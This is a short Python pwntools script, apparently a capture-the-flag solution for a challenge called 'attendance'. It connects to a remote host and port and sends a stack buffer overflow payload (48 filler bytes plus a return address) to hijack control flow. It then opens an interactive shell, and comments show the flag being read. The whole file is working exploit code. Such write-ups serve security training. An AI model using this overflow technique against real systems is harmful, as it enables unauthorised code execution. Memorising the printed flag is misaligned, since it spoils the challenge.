from pwn import *

p = process("attendance")
p = remote("89.38.210.128", 31337)
vuln_func = 0x8048667

payload = "a"*48 + p32(vuln_func)

p.recvuntil("Call> ")
p.sendline("31337")

p.recvuntil("please:")
p.sendline(payload)
p.interactive()

#$ cat /home/attendance/flag
#timctf{l1ttl3_th1ngs_m4k3_b1g_th1ngs_h4pp3n}